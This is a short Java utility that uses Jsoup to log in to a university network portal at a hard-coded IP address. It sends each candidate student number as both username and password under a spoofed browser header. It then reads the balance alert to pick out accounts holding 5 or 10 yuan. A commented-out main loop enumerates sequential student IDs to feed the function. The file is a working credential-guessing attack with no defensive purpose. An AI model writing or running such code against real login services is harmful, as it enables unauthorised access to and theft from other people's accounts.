package com.ytu.util;

import java.io.IOException;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

public class GetUserInfo {
//	public static void main(String[] args) throws IOException {
//		String stunum = "2012545011";
//		String user = null;
//		
//		for (int i = 0; i < 50; i++){
//			if (i < 10){
//				user = stunum +"0"+i;
//			}else{
//				user = stunum+i;
//			}
//			//System.out.println(user);
//			String username = getInfo(user);
//			if (username != null){
//				
//				System.out.println(username);
//			}
//			
//		}
//	}
	
	public static String getInfo(String user) throws IOException  {
		String url = "http://202.194.116.87/php/user_login.php";

		Connection connection = Jsoup.connect(url);
		connection.timeout(500);	//设置连接超时时间
		connection.header("User-Agent","Mozilla/4.0 (compatible; MSIE 5.0; Windows XP; DigExt)");
		connection.data("loginuser", user);
		connection.data("password", user);
		connection.data("logintype", "连线国内");
		connection.data("refer", "1");
		connection.data("domainid", "2");
		connection.method(Connection.Method.POST);
		
		Document doc = connection.post();	//获取返回的html的document对象
		if (doc == null){
//			System.out.println("null");
			return null;
		}else{
//			System.out.println(doc);
		}
		//解析document对象
		Elements links = doc.select("script");
		
		for (Element e : links) {
				
			if(e.html().equals("alert('您的帐户余额是5元');")){
				return "5元:"+user;
			}else if(e.html().equals("alert('您的帐户余额是10元');")) {
				return "10元:"+user;
			}else if(e.html().equals("alert('您的帐户余额是0元');")){
			}
		}
		return null;
	}

}
